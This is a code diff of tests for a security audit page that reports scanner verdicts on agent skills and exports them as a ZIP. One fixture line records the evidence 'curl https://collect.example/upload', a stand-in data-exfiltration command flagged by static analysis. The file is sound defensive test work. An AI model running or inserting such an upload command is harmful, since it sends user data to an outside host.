@@ -1,11 +1,18 @@
 import { fireEvent, render, screen, waitFor } from "@testing-library/react";
+import { unzipSync } from "fflate";
 import { beforeEach, describe, expect, it, vi } from "vitest";
+import {
+  buildSecurityAuditExportEntries,
+  buildSecurityAuditExportZip,
+  type StaticScan,
+} from "../lib/securityAuditExport";
 import { SecurityAuditPage } from "./SecurityAuditPage";
 import {
   getSkillSpectorIssueCount,
   SecurityScanResults,
   type LlmAnalysis,
   type SkillSpectorAnalysis,
+  type VtAnalysis,
 } from "./SkillSecurityScanResults";
 
 const clawScanAnalysis: LlmAnalysis = {
@@ -157,6 +164,37 @@ const skillSpectorAnalysis: SkillSpectorAnalysis = {
         "Make the manifest and body accurately describe the same skill, and reject deceptive metadata.",
     },
   ],
+};
+
+const staticScan: StaticScan = {
+  status: "suspicious",
+  reasonCodes: ["static.network_request"],
+  findings: [
+    {
+      code: "static.network_request",
+      severity: "warn",
+      file: "SKILL.md",
+      line: 12,
+      message: "Network request found in skill instructions.",
+      evidence: "curl https://collect.example/upload",
+    },
+  ],
+  summary: "Static analysis found an external network request.",
+  engineVersion: "static-publish-scan@1",
+  checkedAt: Date.now(),
+};
+
+const vtAnalysis: VtAnalysis = {
+  status: "suspicious",
+  verdict: "engines",
+  source: "engines",
+  engineStats: {
+    malicious: 1,
+    suspicious: 1,
+    harmless: 2,
+    undetected: 58,
+  },
+  checkedAt: Date.now(),
 };
 
 const originalFetch = globalThis.fetch;
@@ -423,7 +461,6 @@ describe("SecurityScanResults static guidance", () => {
           detailPath: "/local/todo-guard",
         }}
         llmAnalysis={clawScanAnalysis}
-        clawScanNote="Publisher says the Todoist token is required for task sync."
       />,
     );
 
@@ -439,7 +476,6 @@ describe("SecurityScanResults static guidance", () => {
     );
     expect(screen.queryByText(/Current verdict/i)).toBeNull();
     expect(screen.getByRole("heading", { name: "Overview" })).toBeTruthy();
-    expect(screen.getByRole("heading", { name: "Publisher note" })).toBeTruthy();
     expect(screen.getByRole("heading", { name: "Risk analysis" })).toBeTruthy();
     expect(screen.queryByRole("heading", { name: "ClawScan" })).toBeNull();
     expect(screen.getByText(/Collects workspace secrets/i)).toBeTruthy();
@@ -476,7 +512,7 @@ describe("SecurityScanResults static guidance", () => {
       Array.from(container.querySelectorAll(".security-report-main > section h2")).map((node) =>
         node.textContent?.trim(),
       ),
-    ).toEqual(["Overview", "Publisher note", "VirusTotal", "Risk analysis"]);
+    ).toEqual(["Overview", "VirusTotal", "Risk analysis"]);
   });
 
   it("renders SkillSpector findings as the agentic-risk finding source", () => {
@@ -735,7 +771,7 @@ describe("SecurityScanResults static guidance", () => {
     ).toBeTruthy();
   });
 
-  it("prompts publishers to add a note on review ClawScan reports without one", () => {
+  it("does not prompt publishers to add notes on review ClawScan reports", () => {
     render(
       <SecurityAuditPage
         entity={{
@@ -747,37 +783,11 @@ describe("SecurityScanResults static guidance", () => {
         }}
         llmAnalysis={clawScanAnalysis}
         canManageArtifact
-        settingsHref="/local/todo-guard/settings"
       />,
     );
 
-    const link = screen.getByRole("link", { name: "Add a publisher note" });
-    expect(link.getAttribute("href")).toBe("/local/todo-guard/settings");
-    expect(screen.getByText(/to give this audit context on these findings/i)).toBeTruthy();
-  });
-
-  it("hides the publisher note prompt for non-publishers and after dismissal", () => {
-    const props = {
-      entity: {
-        kind: "skill" as const,
-        title: "Todo Guard",
-        name: "todo-guard",
-        version: "1.0.0",
-        detailPath: "/local/todo-guard",
-      },
-      llmAnalysis: clawScanAnalysis,
-      settingsHref: "/local/todo-guard/settings",
-    };
-
-    const { rerender } = render(<SecurityAuditPage {...props} />);
     expect(screen.queryByRole("link", { name: "Add a publisher note" })).toBeNull();
-
-    rerender(<SecurityAuditPage {...props} canManageArtifact />);
-    fireEvent.click(screen.getByRole("button", { name: "Dismiss publisher note prompt" }));
-    expect(screen.queryByRole("link", { name: "Add a publisher note" })).toBeNull();
-
-    rerender(<SecurityAuditPage {...props} canManageArtifact />);
-    expect(screen.queryByRole("link", { name: "Add a publisher note" })).toBeNull();
+    expect(screen.queryByText(/to give this audit context on these findings/i)).toBeNull();
   });
 
   it("keeps plugin audit metadata focused while preserving hash links", () => {
@@ -806,6 +816,26 @@ describe("SecurityScanResults static guidance", () => {
     expect(screen.getByRole("link", { name: /View on VirusTotal/i }).getAttribute("href")).toBe(
       "https://www.virustotal.com/gui/file/seeded-plugin-hash",
     );
+  });
+
+  it("renders latest audit timestamps deterministically for hydration", () => {
+    render(
+      <SecurityAuditPage
+        entity={{
+          kind: "skill",
+          title: "Hydration Guard",
+          name: "hydration-guard",
+          version: "1.0.0",
+          detailPath: "/local/hydration-guard",
+        }}
+        llmAnalysis={{
+          ...clawScanAnalysis,
+          checkedAt: Date.UTC(2024, 0, 2, 3, 4),
+        }}
+      />,
+    );
+
+    expect(screen.getByText("Jan 2, 2024 at 3:04 AM UTC")).toBeTruthy();
   });
 
   it("shows VirusTotal reports in the shared scanner report shell", () => {
@@ -1054,6 +1084,55 @@ describe("SecurityScanResults static guidance", () => {
     ).toEqual(["Overview", "SkillSpector", "VirusTotal"]);
   });
 
+  it("builds a security audit ZIP with scanner outcome files", () => {
+    const input = {
+      entity: {
+        kind: "skill" as const,
+        title: "Pattern Guard",
+        name: "pattern-guard",
+        version: "1.2.3",
+        detailPath: "/local/pattern-guard",
+      },
+      sha256hash: "a".repeat(64),
+      llmAnalysis: clawScanAnalysis,
+      skillSpectorAnalysis,
+      staticScan,
+      vtAnalysis,
+      exportedAt: "2026-06-02T15:00:00.000Z",
+    };
+
+    expect(buildSecurityAuditExportEntries(input).map((entry) => entry.path)).toEqual([
+      "manifest.json",
+      "clawscan.json",
+      "skillspector.json",
+      "static-analysis.json",
+      "virustotal.json",
+    ]);
+
+    const zipEntries = unzipSync(buildSecurityAuditExportZip(input));
+    const decode = (path: string) => new TextDecoder().decode(zipEntries[path]);
+
+    expect(Object.keys(zipEntries).sort()).toEqual([
+      "README.md",
+      "clawscan.json",
+      "manifest.json",
+      "skillspector.json",
+      "static-analysis.json",
+      "virustotal.json",
+    ]);
+    expect(JSON.parse(decode("manifest.json")).scanners).toEqual({
+      clawscan: "suspicious",
+      skillspector: "suspicious",
+      staticAnalysis: "suspicious",
+      virustotal: "suspicious",
+    });
+    expect(JSON.parse(decode("skillspector.json")).issues[0].issueId).toBe("SDI-1");
+    expect(JSON.parse(decode("static-analysis.json")).findings[0].code).toBe(
+      "static.network_request",
+    );
+    expect(JSON.parse(decode("virustotal.json")).engineStats.malicious).toBe(1);
+  });
+
   it("shows plugins with legacy ClawScan analysis in the new ClawScan report shell", () => {
     render(
       <SecurityAuditPage
@@ -1192,10 +1271,28 @@ describe("SecurityScanResults static guidance", () => {
       />,
     );
 
+    expect(screen.getByRole("button", { name: "Download security audit" })).toBeTruthy();
     fireEvent.click(screen.getByRole("button", { name: "Rescan" }));
 
     await waitFor(() => expect(requestRescan).toHaveBeenCalledTimes(1));
     expect(screen.getByRole("button", { name: "Scanning" })).toHaveProperty("disabled", true);
+  });
+
+  it("hides security audit downloads when rescans are not available", () => {
+    render(
+      <SecurityAuditPage
+        entity={{
+          kind: "skill",
+          title: "Public Guard",
+          name: "public-guard",
+          version: "1.0.0",
+          detailPath: "/local/public-guard",
+        }}
+      />,
+    );
+
+    expect(screen.queryByRole("button", { name: "Rescan" })).toBeNull();
+    expect(screen.queryByRole("button", { name: "Download security audit" })).toBeNull();
   });
 
   it("lets plugin managers use the shared security rescan control", async () => {
